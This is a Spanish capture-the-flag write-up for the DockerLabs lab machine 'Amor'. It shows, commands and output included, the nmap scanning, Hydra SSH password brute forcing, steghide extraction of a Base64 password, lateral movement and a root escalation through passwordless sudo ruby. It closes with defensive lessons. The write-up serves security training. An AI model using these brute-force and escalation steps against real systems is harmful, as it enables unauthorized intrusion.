# Amor — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** Romabri  
**Fecha de creación:** 26/04/2024  
**Técnicas:** Nmap · Hydra · SSH · SCP · Steghide · CyberChef · Privesc (ruby/sudo)

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — usuarios visibles](#2-enumeración-web--usuarios-visibles)
3. [Fuerza bruta SSH con Hydra](#3-fuerza-bruta-ssh-con-hydra)
4. [Esteganografía — imagen con contraseña oculta](#4-esteganografía--imagen-con-contraseña-oculta)
5. [Movimiento lateral a oscar](#5-movimiento-lateral-a-oscar)
6. [Escalada de privilegios](#6-escalada-de-privilegios)
7. [Lección aprendida](#7-lección-aprendida)

---

## 1. Despliegue y reconocimiento

```bash
sudo bash auto_deploy.sh amor.tar
```

> IP asignada: `172.17.0.2`.

Escaneo completo con guardado en fichero:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
cat Puertos
```

```
PORT   STATE SERVICE REASON     VERSION
22/tcp open  ssh     syn-ack    (protocol 2.0)
80/tcp open  http    syn-ack    Apache httpd
```

---

## 2. Enumeración web — usuarios visibles

Visitamos `http://172.17.0.2` y encontramos la web de **SecurSEC S.L.** con varias noticias de seguridad. Una de ellas dice:

> **¡Importante! Despido de empleado** — Juan fue despedido de la empresa por enviar un correo con la contraseña a un compañero. Firmado: Carlota, Departamento de ciberseguridad.

Los nombres **Juan** y **Carlota** son usuarios potenciales del sistema.

> 💡 Las páginas web corporativas son una fuente habitual de enumeración de usuarios. Nombres de empleados, firmas de correo, footers — todo da pistas.

---

## 3. Fuerza bruta SSH con Hydra

Con los usuarios identificados, atacamos SSH:

```bash
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2:22
```

```
[22][ssh] host: 172.17.0.2   login: carlota   password: babygirl
```

Contraseña encontrada: **carlota:babygirl**. Conectamos:

```bash
ssh carlota@172.17.0.2
```

```
carlota@509a309797a5:~$
```

---

## 4. Esteganografía — imagen con contraseña oculta

Explorando el directorio de carlota encontramos una imagen:

```bash
carlota@509a309797a5:~/Desktop/fotos/vacaciones$ ls -la
-rw-r--r-- 1 root root 51914 Apr 26 2024 imagen.jpg
```

Nos la copiamos a nuestra máquina atacante con SCP:

```bash
scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/caan31/Documentos/DockerLabs/amor/
```

Intentamos extraer datos ocultos con steghide (sin contraseña):

```bash
steghide extract -sf imagen.jpg
```

```
Anotar salvoconducto:
anot• los datos extra•dos e/"secret.txt".
```

Leemos el fichero extraído:

```bash
cat secret.txt
```

```
ZXNsYWNhc2FkZXBpbnlwb24=
```

> 💡 Esto parece Base64. Lo decodificamos con CyberChef → operación **From Base64**:

```
eslacasadepinypon
```

---

## 5. Movimiento lateral a oscar

Listamos los usuarios del sistema:

```bash
carlota@509a309797a5:~$ ls -la /home/
drwxr-x--- 1 carlota carlota  4096 Sep 30 16:44 carlota
drwxr-x--- 1 oscar   oscar    4096 Apr 26 2024 oscar
drwxr-x--- 2 ubuntu  ubuntu   4096 Apr 23 2024 ubuntu
```

Probamos la contraseña decodificada con oscar:

```bash
carlota@509a309797a5:~$ su oscar
Password: eslacasadepinypon
$ whoami
oscar
```

✅ Somos **oscar**.

---

## 6. Escalada de privilegios

Comprobamos sudo de oscar:

```bash
$ sudo -l
```

```
User oscar may run the following commands on 509a309797a5:
    (ALL) NOPASSWD: /usr/bin/ruby
```

**ruby con sudo sin contraseña**. GTFObins nos da el comando:

```bash
$ sudo ruby -e 'exec "/bin/sh"'
# whoami
root
```

✅ Somos **root**.

---

## 7. Lección aprendida

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| **Nombres de usuarios en web corporativa** | `http://172.17.0.2` | Enumeración de cuentas SSH |
| **Contraseña débil (babygirl)** | carlota en SSH | Fuerza bruta exitosa |
| **Datos ocultos en imagen (steganografía)** | `imagen.jpg` → secret.txt | Contraseña de oscar en Base64 |
| **ruby con sudo sin restricción** | `/usr/bin/ruby` | Escalada directa a root |

**Para defenderse:**
- Revisar qué información personal o de empleados es visible en la web pública.
- Usar contraseñas robustas — "babygirl" aparece en rockyou.txt en las primeras 100k entradas.
- La esteganografía no es cifrado. Los datos ocultos en imágenes son accesibles con herramientas libres.
- Cualquier intérprete de lenguaje (ruby, python, perl) con sudo es una escalada garantizada.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
